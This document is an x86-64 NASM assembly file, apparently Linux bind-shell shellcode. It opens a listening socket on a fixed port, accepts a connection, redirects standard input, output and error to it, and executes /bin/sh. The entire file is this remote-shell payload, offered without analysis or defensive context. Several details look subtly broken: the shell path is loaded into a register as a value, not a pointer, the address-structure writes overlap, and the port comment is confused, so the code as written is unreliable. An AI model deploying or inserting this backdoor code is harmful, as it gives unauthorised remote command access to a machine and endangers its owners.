bits 64
section .text
global _start

_start:
  xor rax, rax
  
  ; setup sock syscall
  mov rdi, 2
  mov rsi, 1
  xor rdx, rdx
  mov rax, 41
  syscall
  mov rdi, rax ;fd for dup2
  
  ;setup the struct
  xchg rdi, rax
  
  sub rsp, 8
  mov word[rsp], 2 ; addr.sin_family = AF_INET;
  mov dword[rsp+2], 0x0620 ; addr.sin_port = 0x0620;    //this is byte swapped 2006 == 8198
  mov dword[rsp+4], 0 	 ; addr.sin_addr.s_addr = 0;
  mov rsi, rsp
  
  ;bind
  ; rdi still holds fd
  mov rsi, rsp ; struct sockaddr
  mov rdx, 16 ; sockaddr size
  mov rax, 49
  syscall
  
  ;listen
  mov rsi, 2  
  mov rax, 50
  syscall
  
  ;accept connex
  sub rsp, 16
  mov rsi, rsp
  mov byte [rsp-1], 16
  sub rsp, 1
  mov rdx, rsp
  mov rax, 43
  syscall
  
  ;save incoming connex fd
  xor r8, r8
  mov r8, rax
  
  ;dup2 for stdin/out/err
  xor r9, r9
  mov r9, 2 ;err
  
  .loop_fd:
        mov rdi, r8
        mov rax, 33 ;dup2
        mov rsi, r9
        syscall
    dec r9
    jns .loop_fd
  
  ;get shell
  
  mov rdi, '//bin/sh'
  mov rsi, 0x00
  mov rdx, 0x00
  mov rax, 59
  syscall
  
  
  
  
  
  
  
